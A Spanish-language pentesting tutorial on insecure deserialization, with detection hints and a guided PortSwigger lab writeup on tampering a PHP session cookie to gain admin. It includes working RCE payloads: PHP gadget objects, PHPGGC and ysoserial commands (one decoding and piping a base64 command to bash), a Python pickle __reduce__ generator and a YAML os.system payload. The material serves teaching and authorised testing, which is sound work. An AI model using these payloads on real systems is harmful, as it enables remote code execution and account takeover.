# Deserialización Insegura

La **serialización** convierte un objeto en una cadena de bytes para guardarlo o enviarlo; la **deserialización** lo reconstruye. Si una aplicación deserializa datos **controlados por el usuario** sin validarlos, un atacante puede construir un objeto malicioso que, al reconstruirse, ejecute código → **RCE**.

Es **A08** del OWASP Top 10 y uno de los fallos más potentes (y peligrosos) en aplicaciones.

---

## Cómo detectarlo

Busca datos serializados que viajen del cliente al servidor: cookies, parámetros ocultos, tokens, campos `VIEWSTATE`, colas de mensajes. Pistas por formato:

| Formato / pista | Tecnología |
| --------------- | ---------- |
| Empieza por `O:` o `a:` (`O:4:"User"...`) | **PHP** (`serialize`) |
| Empieza por `rO0AB...` (Base64 de `AC ED 00 05`) | **Java** (ObjectOutputStream) |
| `gASV...` / bytes `80 04` | **Python** (pickle) |
| `BinaryFormatter` / `__VIEWSTATE` | **.NET** |
| YAML con `!!python/object` o `!ruby/object` | **YAML inseguro** |

> **Consejo:** si una cookie o un parámetro decodifica (Base64) a algo que empieza por `O:` (PHP) o `rO0` (Java), casi seguro estás ante deserialización. Es un hallazgo de impacto crítico; priorízalo.

---

## PHP — gadget chains con `unserialize()`

PHP invoca "métodos mágicos" (`__wakeup`, `__destruct`, `__toString`) al deserializar. Si una clase del proyecto hace algo peligroso en esos métodos, encadenas hasta RCE.

Objeto malicioso de ejemplo (la clase existe en el código de la app):

```php
O:4:"Logu":1:{s:3:"cmd";s:2:"id";}
```

Herramienta: **PHPGGC** genera cadenas de gadgets para frameworks conocidos (Laravel, Symfony, Monolog…):

```bash
phpggc Monolog/RCE1 system id -b     # -b = salida en base64
```

---

## Java — ysoserial

El clásico. **ysoserial** genera payloads según las librerías del classpath (CommonsCollections, etc.):

```bash
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<BASE64>}|{base64,-d}|bash' | base64
```

Ese blob serializado se envía donde la app deserialice (cookie, parámetro, endpoint).

---

## Python — pickle

`pickle.loads()` sobre datos del usuario es RCE directo. El método `__reduce__` controla qué se ejecuta al deserializar:

```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

Envía esa cadena donde la app haga `pickle.loads(base64.b64decode(...))`.

---

## YAML inseguro

`yaml.load()` (sin `SafeLoader`) permite instanciar objetos arbitrarios:

```yaml
!!python/object/apply:os.system ["id"]
```

> **Nota:** la mitigación es usar siempre el cargador seguro (`yaml.safe_load`, `pickle` nunca sobre datos externos, firmar los objetos serializados). Útil para la sección de remediación del informe.

---

## Flujo de explotación

```flow
Identificar dato serializado :: Cookie/param que decodifica a O: / rO0 / pickle.
Identificar lenguaje y librerías :: PHP, Java, Python, .NET + frameworks del classpath.
Generar la gadget chain :: PHPGGC / ysoserial / __reduce__ / YAML.
Inyectar el payload :: Donde la app deserialice; recoge la reverse shell.
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `ysoserial` | Payloads de deserialización Java. |
| `PHPGGC` | Gadget chains para PHP. |
| `GadgetProbe` / `Freddy` (Burp) | Detectar deserialización y librerías. |
| `ysoserial.net` | Equivalente para .NET. |

---

> **Consejo:** no intentes construir la gadget chain a mano: identifica el **lenguaje** y las **librerías** presentes, y deja que `ysoserial` (Java) o `phpggc` (PHP) generen el payload. El trabajo del pentester es **localizar el punto de deserialización** y **averiguar qué gadgets hay disponibles**; las herramientas hacen el resto.

---

## Dónde practicar la deserialización

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — Insecure deserialization | Labs gratis | https://portswigger.net/web-security/deserialization |
| ysoserial (Java) | GitHub | https://github.com/frohoff/ysoserial |
| PHPGGC (PHP) | GitHub | https://github.com/ambionics/phpggc |
| VulnHub / HTB retiradas (Java/PHP) | Máquinas completas | https://www.vulnhub.com |

## Writeup guiado: manipular un objeto PHP serializado (PortSwigger)

Lab: *"Modifying serialized objects"*. Objetivo: escalar a admin manipulando la cookie de sesión y borrar a `carlos`.

```flow
Localizar :: La cookie de sesión es un objeto PHP serializado en Base64.
Decodificar :: Base64 -> ves un campo admin a false (b:0).
Manipular :: Cambiar admin a true (b:1) y re-serializar.
Re-codificar :: Base64 de nuevo y enviarlo como cookie.
Resolver :: Acceder al panel admin y borrar al usuario carlos.
```

### Paso 1 — Decodificar la cookie

La cookie `session` decodifica (Base64) a algo como:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

### Paso 2 — Manipular y re-codificar

Cambia `b:0` por `b:1` (admin = true):

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

```bash
echo -n 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64
```

Sustituye la cookie por el nuevo Base64 (Burp Repeater). Ahora eres admin → accede a `/admin` y borra a `carlos`.

> **Consejo:** este lab enseña lo esencial: **el objeto serializado viaja del cliente y puedes reescribirlo**. Para RCE real (gadget chains), los labs avanzados de PortSwigger usan `phpggc`/`ysoserial`; ahí el trabajo es identificar el lenguaje y las librerías, y dejar que la herramienta genere el payload.
